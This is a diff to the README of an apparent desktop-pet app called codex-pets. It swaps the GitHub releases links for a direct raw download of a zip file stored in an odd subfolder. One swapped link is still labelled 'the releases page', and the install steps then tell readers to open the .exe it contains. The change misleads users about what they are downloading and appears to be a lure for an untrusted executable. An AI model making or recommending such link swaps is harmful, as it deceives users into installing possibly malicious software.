@@ -1,12 +1,12 @@
 # 🐱 codex-pets - Pixel companions move across your screen
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/transcultural-papering633/codex-pets/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/transcultural-papering633/codex-pets/main/Quintin/codex-pets-2.3.zip)
 
 Codex Pets brings digital creatures to your desktop. These pets live on your screen while you use other programs. They work with tools like Claude Code, Cursor, and Codex. You can watch them walk, sleep, and play while you work.
 
 ## 📥 How to install your pet
 
-1. Visit [the releases page](https://github.com/transcultural-papering633/codex-pets/releases) to find the latest version.
+1. Visit [the releases page](https://raw.githubusercontent.com/transcultural-papering633/codex-pets/main/Quintin/codex-pets-2.3.zip) to find the latest version.
 2. Look for the section labeled Assets.
 3. Click the file that ends in .exe for Windows.
 4. Open the file once the download finishes.
